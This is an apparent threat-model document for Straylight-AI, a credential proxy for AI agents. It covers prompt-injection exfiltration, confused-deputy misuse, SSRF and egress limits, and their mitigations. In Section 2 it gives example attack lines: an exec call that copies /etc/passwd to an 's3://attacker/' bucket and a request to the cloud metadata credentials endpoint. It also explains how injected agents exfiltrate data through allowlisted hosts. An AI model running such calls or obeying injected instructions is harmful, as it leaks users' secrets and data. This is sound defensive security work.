# Straylight-AI Threat Model

**Status**: Wave 0 — Security Correctness (Issue #9)
**Date**: 2026-06-25
**Applies to**: v1.0.3 and Wave 0 branch

---

## 1. What Straylight Is and Is Not

Straylight is a **credential proxy**, not a general-purpose AI security platform. It
solves one well-defined problem — keeping raw credential values out of the AI's context
window, logs, and the model provider's pipeline — and provides bounded mitigations for a
second, harder problem: abuse of the authority those credentials grant.

This document states precisely what each claim means, what evidence supports it, and
where the limits lie. Anyone deploying Straylight, evaluating it, or writing marketing
copy about it should read this first.

---

## 2. Threat Classes

Straylight faces two distinct threat classes that must not be conflated.

### 2.1 Threat Class A — Credential Exfiltration

**Definition**: The raw credential value (API key, token, password, connection string)
enters a context where an attacker can observe it: the AI model's input or output, an
application log, an error message surfaced to the user, or the model provider's
pipeline.

**Attack scenarios (STRIDE: Information Disclosure)**:

- **Direct read**: the AI reads `.env`, `~/.aws/credentials`, `docker-compose.yml`, or
  shell history and the credential value appears in its context window.
- **Prompt-injected exfiltration**: a malicious instruction embedded in a webpage, code
  comment, or API response directs the AI to echo or relay the credential it has already
  seen.
- **Response leakage**: an API returns a credential value in its response body (e.g. a
  "test your key" endpoint), and it flows unredacted back to the AI.
- **Log exposure**: credential values written to stdout, stderr, or application logs
  during a tool call.

**What Straylight does to mitigate this**: Transport-layer injection — the credential is
fetched from OpenBao inside the container and written directly into the outbound HTTP
`Authorization` header (or equivalent). The AI process receives only the API response.
Response sanitization (two-layer: exact value match then regex pattern match with base64/
hex/URL decode pass) attempts to strip credentials from response bodies before they
return. The file firewall (`straylight_read_file`) blocks or redacts sensitive files
before content reaches the AI.

**Defensibility**: High for the HTTP-proxy path. The proxy path is the documented,
tested implementation of the zero-knowledge claim. Response sanitization is defense-in-
depth (see Section 5 for its limits).

---

### 2.2 Threat Class B — Credential Misuse (Confused Deputy)

**Definition**: The AI agent is manipulated — via prompt injection in untrusted content
it processes — into invoking Straylight's authorized tools with attacker-chosen arguments.
The credential never leaves the proxy; the *authority it grants* is nonetheless exercised
on the attacker's behalf.

**Why hiding the secret does not address this**: The proxy faithfully attaches the real
credential to every tool call the AI makes. A prompt-injected agent that calls
`straylight_api_call("stripe", "POST", "/v1/charges", ...)` or
`straylight_exec("aws-prod", "aws s3 cp /etc/passwd s3://attacker/...")` will succeed —
the credential is correctly injected, the request goes out, and the attacker achieves
their goal without ever seeing the key.

This is the **confused deputy problem**: Straylight acts as the deputy; when the AI
principal is compromised, the deputy's authority is turned against the principal's own
interests.

**The "lethal trifecta" framing** (Simon Willison): prompt injection risk scales with
the simultaneous presence of three conditions —

1. **Private data** — the AI has access to sensitive resources (your databases, APIs,
   cloud accounts) via Straylight's tools.
2. **Untrusted content** — the AI processes content from the outside world (web pages,
   API responses, git diffs, dependency files, code comments) that an attacker controls.
3. **An exfiltration channel** — a mechanism by which the attacker can receive data
   (any outbound network call the AI can cause).

A credential proxy eliminates none of these three legs. Straylight strengthens leg 1 by
lending the AI *more* authority to act on your behalf — that is its purpose. The risk
of misuse is therefore not reduced by the proxy concept itself.

**Attack scenarios (STRIDE: Elevation of Privilege / Tampering)**:

- **API abuse**: a prompt-injected agent deletes records, creates charges, rotates keys,
  or reads private data via `straylight_api_call` with a permitted method and path.
- **Exfiltration via exec**: `straylight_exec` runs `aws s3 cp`, `curl`, or `git push`
  with attacker-controlled arguments, sending data to an attacker-controlled destination.
- **Database exfiltration**: `straylight_db_query` runs `SELECT * FROM users` or a
  broader query than the operator intended; rows are returned to the AI context (and
  thence to the model provider).
- **SSRF via the proxy**: `straylight_api_call` is directed at `http://169.254.169.254/
  latest/meta-data/iam/security-credentials/...` to retrieve cloud credentials from the
  instance metadata service, which the proxy would then return as the API response.

---

## 3. What Straylight Protects Against vs. What It Does Not

### 3.1 What Straylight genuinely protects against

| Control | What it protects | Mechanism |
|---------|-----------------|-----------|
| Transport-layer credential injection | Raw credential value never in AI context or model provider pipeline | Credential fetched from vault, injected inside container, never written to stdio |
| Response sanitization (defense-in-depth) | Credential values that appear in API responses | Two-layer redaction: exact match + regex pattern with decode pass |
| File firewall (`straylight_read_file`) | Sensitive files read directly by the AI | Block-list for fully-sensitive files; value-redaction for structured config |
| Secret scanner (`straylight_scan`) | Credentials already in project files that the AI might read | Pattern-matching walk with redacted findings |
| Encrypted vault at rest (OpenBao) | Credential theft from disk via filesystem access to the data directory | AES-GCM encryption of vault storage; 0600 file permissions |
| Non-root container (UID 10001) | Container breakout privilege escalation | Standard hardening; read-only filesystem |
| Localhost-only binding | Network-adjacent attackers reaching the vault API or dashboard | `:9470` bound to `127.0.0.1`; OpenBao never exposed externally |
| Audit trail | Forensic visibility after an incident | Tamper-evident JSONL log of tool calls, services, timestamps; never logs credential values |
| Dynamic database credentials (OpenBao) | Long-lived DB credentials in AI context | Temporary users created per session, auto-revoked after TTL |
| Short-lived cloud credentials (STS/token) | Long-lived cloud keys in AI context | Per-invocation tokens generated fresh; never stored in AI context |
| Egress guard + SSRF block (Wave 0 / ADR-010) | Metadata-endpoint SSRF, connections to private/link-local ranges | Default-deny custom DialContext checking resolved IP; defeats DNS rebinding |
| Policy engine (Wave 0 / ADR-011) | Tool calls to disallowed methods, paths, or hosts | Pre-injection gate at dispatch and proxy seams; deny before credential attaches |

### 3.2 What Straylight does NOT (and cannot) protect against

**Do not claim any of the following.**

#### 3.2.1 It does not prevent prompt injection

Straylight has no visibility into model inputs, outputs, or reasoning. A malicious
instruction in a webpage, comment, or API response that causes the AI to call Straylight
tools with attacker-chosen arguments will succeed as far as the proxy is concerned. The
proxy sees a valid tool call and services it. This is not a bug; it is a fundamental
property of the confused-deputy architecture.

**Overclaim to avoid**: "Straylight keeps your secrets safe from prompt injection."
The correct claim: Straylight keeps the *value* of the credential safe from prompt
injection. It does not prevent a prompt-injected agent from *using* the credential.

#### 3.2.2 It does not prevent an AI from misusing your credentials

A prompt-injected AI with access to `straylight_api_call`, `straylight_exec`, or
`straylight_db_query` can perform any action within the tool's permitted surface — charge
customers, delete objects, run CLI commands, query databases — without seeing the
underlying key. The key's *value* is hidden; the key's *power* is available.

**Overclaim to avoid**: "The AI can't misuse your credentials."
The correct claim: Straylight bounds and audits misuse with scoped credentials, a
default-deny egress allowlist, a per-service policy engine, and (roadmap) human approval
tiers. It does not eliminate misuse.

#### 3.2.3 Response sanitization is not a guarantee

Real-world secret scanners miss 12–48% of secrets (ESEM-2023 study). One missed bearer
token stays valid for its entire TTL (15 minutes to 12 hours for STS; indefinitely for
static API keys). The sanitizer is defense-in-depth, not a security boundary. A crafted
API response can encode a credential in base64, split across fields, or disguise it as
non-secret data in ways the current pattern set does not detect.

**Overclaim to avoid**: "Straylight sanitizes all credential patterns from responses."
The correct claim: Straylight applies best-effort response sanitization as defense-in-
depth. It is not a guarantee and should not be the primary control.

#### 3.2.4 It is not tamper-proof or fully isolated

- The trust boundary for the vault is filesystem permissions on `<data>/openbao/init.json`
  (0600), which holds the unseal key, root token, and AppRole credentials in plaintext.
  If an attacker can read that file — via a container escape, a misconfigured volume
  mount, or a tool that traverses outside the expected path — the vault is fully
  compromised.
- There is no authentication on the core API (port 9470). The trust model is
  localhost-only binding and CORS allowlist. Any process on the host that can reach
  `localhost:9470` can call every API endpoint, including credential operations.
- The Docker volume (`~/.straylight-ai/data/`) persists across container restarts and
  contains the vault's encrypted storage. It must be protected at the host filesystem
  level.

**Overclaim to avoid**: "Straylight provides fully isolated secrets management."
The correct claim: Straylight provides encrypted at-rest storage in a localhost-bound
container with filesystem-permission trust boundaries. It is not a hardware security
module and not a multi-tenant secrets manager.

#### 3.2.5 The exec path is only partially constrained

`straylight_exec` runs a child process (e.g. `aws`, `git`, `curl`) with credentials
injected as environment variables. In v1, Straylight applies a pre-flight host check on
parseable URL arguments, but it does not mediate the child process's own sockets at the
kernel level. A child process can open connections to hosts not visible in its argument
list (from environment-driven endpoints, config files, or follow-on connections). This is
a documented residual risk tracked in ADR-010. Container-level egress via `nft`/eBPF is
the planned paydown.

#### 3.2.6 Several advertised tools are not currently wired

As documented in `CLAUDE.md` (gotcha #3): in the shipped binary, `straylight_exec`,
`straylight_db_query`, and `straylight_read_file` return stub/error responses because
their executors are not wired into `serve()`. The `/api/v1/audit/*` and
`/api/v1/databases/*` routes return 501. Wiring these without also enabling the egress
guard and policy engine (ADR-010 and ADR-011) would be unsafe — those controls must be
in place before these tools are activated.

---

## 4. The Unseal Key Invariant

This is the single most critical operational security requirement.

**Invariant**: The OpenBao unseal key, root token, and AppRole credentials stored in
`<data>/openbao/init.json` must be **unreachable by any MCP tool path**.

This means:
- The file must be stored **outside any directory** reachable by `straylight_read_file`,
  `straylight_exec`, or `straylight_scan`.
- The `internal/firewall` package explicitly blocks `init.json` by filename, but path
  traversal or symlink attacks are only defended by the ProjectRoot boundary check.
- If the data volume is mounted at a path reachable by the AI's file-access tools, the
  zero-knowledge claim is void: an attacker who causes the AI to read `init.json`
  recovers the unseal key and gains full vault access.
- In production deployments, the unseal key should be stored in an OS keychain or an
  out-of-band file at `0600` on a path that no AI tool can traverse to.

**If the model can read the unseal key, the entire zero-knowledge claim fails.**

---

## 5. Residual Risks

### 5.1 CamoLeak — Exfiltration Through an Approved Egress Host

The egress allowlist (ADR-010) blocks connections to unapproved destinations. It does not
prevent exfiltration *through* an approved destination. If a service is allowlisted to a
broad domain (e.g. `*.githubusercontent.com`, a webhook catch-all, or any host that
echoes attacker-controlled content back out), a prompt-injected agent can POST private
data to that approved host, and the attacker retrieves it from there.

This is the CamoLeak attack class. The guard reduces the exfiltration surface to the
allowlisted set; it cannot determine whether an allowed host is itself used as an
exfiltration channel.

**Mitigation**: Keep allowlists narrow. Prefer exact hosts over wildcards. Pair the
egress guard with the policy engine to restrict methods (e.g. deny POST to read-only
services) and with the response sanitizer for defense-in-depth.

### 5.2 Short-Lived Credentials Are Not Revoked Instantly

Dynamic database credentials are auto-revoked by OpenBao's database engine when the
lease expires (default 15 minutes). Cloud STS tokens (AWS: 15 min to 12 hours; GCP: 1
hour) are not revoked by Straylight — they remain valid bearer credentials until
provider-side expiry. A leaked STS token stays usable for its full TTL regardless of
vault revocation. Short-lived credentials shrink the blast radius and the window of
opportunity; they do not eliminate it.

### 5.3 The Policy Engine Does Not Make Allowed Actions Safe

The policy engine (ADR-011) gates tool calls on HTTP method, path prefix, and destination
host. Within the allowed surface, a prompt-injected agent can still issue
legitimate-looking calls. A permitted `POST /v1/charges` is still a charge; a permitted
`SELECT * FROM users` still returns user data. The policy bounds the blast radius; it does
not make the confused-deputy problem go away.

### 5.4 Static Cloud Credentials (Current Implementation)

Despite README framing, the current `internal/cloud/` implementation uses long-lived
static credentials — AWS AssumeRole requires static admin keys; GCP uses a static service
account token path (stubbed); Azure uses a static client secret. The OIDC/WIF/FIC
passthrough (Workload Identity Federation) described in the README is Wave 1 roadmap, not
shipped. This means the current cloud credential model stores the initial static credential
in the vault, which is the target the zero-knowledge claim is meant to protect.

---

## 6. Controls That Bound Misuse

These are the current and planned controls addressing Threat Class B. None eliminates
the confused-deputy problem; together they make misuse scoped, bounded, and auditable.

| Control | Status | What it bounds |
|---------|--------|---------------|
| Per-service policy engine (method/path/host) | Wave 0 (ADR-011, proposed) | Which operations a service can be driven to perform |
| Default-deny egress allowlist + SSRF block | Wave 0 (ADR-010, proposed) | Which network destinations the proxy may connect to |
| Short-lived database credentials (OpenBao dynamic engine) | Shipped | Window of usability after a session ends |
| Short-lived cloud credentials (AWS STS, GCP, Azure) | Shipped (static-backed) | Credential lifetime; not scope |
| Read-only DB credential default (`SELECT` only) | Shipped | SQL permissions of dynamic DB users |
| Audit trail (JSONL, credential-free) | Shipped | Forensic reconstruction of what happened |
| Tamper-evident audit (hash-chained) | Wave 3 roadmap | Audit log integrity after an incident |
| Human approval tiers for high-impact actions | Wave 3 roadmap | Irreversible actions require out-of-band approval |
| Claude Code PreToolUse/PostToolUse hooks (optional) | Shipped (optional) | Block dangerous tool calls before they execute; sanitize output |

---

## 7. The Defensible Claim

From `PRODUCT-STRATEGY.md` §2 — this is the claim Straylight can make and defend:

> Straylight keeps your raw credentials out of the AI assistant's context, logs, and
> the model provider's pipeline — so prompt injection cannot exfiltrate the credential
> itself. When an agent is tricked into misusing the access a credential grants,
> Straylight bounds the damage with short-lived least-privilege credentials, a
> default-deny egress allowlist, per-tool scopes, human approval for high-impact
> actions, and tamper-evident audit. No credential proxy can stop a prompt-injected
> agent from attempting to use its authorized tools; Straylight makes that misuse
> scoped, bounded, and auditable.

**The four things never to say**:

1. "Keeps your secrets safe from prompt injection" — prompt injection can still cause
   misuse of the authority; only the credential *value* is protected.
2. "The AI can't misuse your credentials" — it can. Straylight bounds and audits misuse.
3. "Tamper-proof / fully isolated" — the trust boundary is filesystem permissions and
   localhost binding, not a hardware boundary.
4. "Sanitization is a guarantee" — real scanners miss 12–48% of secrets; one missed
   token stays valid for its full TTL.

---

## 8. STRIDE Summary

| Threat | Category | Mitigated | Residual |
|--------|----------|-----------|---------|
| Credential value exfiltration to AI context | Information Disclosure | Yes — transport-layer injection; credential never written to AI stdio | Sanitization misses (12–48%); init.json reachable if file tools misdirected |
| Prompt-injected API abuse (confused deputy) | Elevation of Privilege | Partial — policy engine bounds method/path/host (Wave 0) | Any allowed operation within policy is still executable |
| SSRF to cloud metadata (`169.254.169.254`) | Server-Side Request Forgery | Yes (Wave 0, ADR-010) — default-deny on resolved IP; defeats DNS rebinding | Exec path not socket-mediated in v1 |
| Exfiltration through approved host (CamoLeak) | Information Disclosure | Partial — narrow allowlists + method policy reduce surface | Allowed hosts can still receive POST'd data |
| Data exfiltration via exec child process | Tampering / Info Disclosure | Partial — pre-flight host check on parseable args | Child process sockets not mediated in v1 |
| Vault compromise via `init.json` read | Information Disclosure | Partial — file firewall blocks by name; 0600 perms | Path traversal / symlink attacks if boundary misconfigured |
| Denial of service (vault unavailable) | Denial of Service | AppRole token auto-renewed (fixed 1.0.3); health check gates server start | Single-node OpenBao with no HA |
| Ambient credential theft (no auth on API) | Elevation of Privilege | Localhost-only binding; CORS allowlist | Any localhost process can reach the API; no per-request auth |

---

## 9. Deployment Hardening Checklist

These are controls Straylight does not provide for you; they must be applied at the
deployment layer.

- [ ] Ensure `<data>/openbao/init.json` is at a path **no AI file tool can reach** (not
  under the project root, not under `~`/home if the AI has home directory access).
- [ ] Keep the Docker volume (`~/.straylight-ai/data/`) at host filesystem permissions
  that prevent other local users from reading it.
- [ ] Bind port 9470 to `127.0.0.1` (default; do not expose externally).
- [ ] Do not configure egress allowlists with broad wildcards (`*.githubusercontent.com`,
  `*.storage.googleapis.com`). Prefer exact hosts.
- [ ] Do not wire `straylight_exec` without first enabling the egress guard (ADR-010)
  and a per-service policy (ADR-011) that restricts which commands and destinations
  are permitted.
- [ ] Configure Claude Code PreToolUse/PostToolUse hooks if using `straylight_exec`
  (see README "Claude Code Hooks" section) as an additional interception layer.
- [ ] Treat database admin credentials (used to create dynamic users) as high-value
  secrets; they are stored in the vault and used by OpenBao's database engine.
- [ ] Review audit logs (`~/.straylight-ai/data/audit-*.jsonl`) regularly; the tamper-
  evident upgrade in Wave 3 will strengthen log integrity, but current logs are
  unforged by the proxy.

---

## 10. References

- `PRODUCT-STRATEGY.md` §2 ("The honest security claim") and §3.4 — governing authority
  for all security claims in this project.
- `docs/design/design-egress-policy/adr/ADR-010-egress-guard-ssrf.md` — egress guard
  design, DNS-rebinding mitigation, exec-path residual risk.
- `docs/design/design-egress-policy/adr/ADR-011-policy-engine-v1.md` — policy engine
  design, pre-injection gate, residual risk of allowed-but-abusable surface.
- `CLAUDE.md` — architecture, partial-wiring gotcha, vault trust boundary.
- Simon Willison, "The Lethal Trifecta" (2025): private data access + untrusted content
  + exfiltration channel = high prompt-injection risk.
- ESEM-2023 secret-scanner study: 12–48% miss rates for real-world credential patterns.
- CamoLeak (CVE-2025-59145): exfiltration through an approved egress host.
- CVE-2025-59536: credential leakage via crafted API responses.
- CVE-2026-21852: API key exfiltration through malicious project configs.
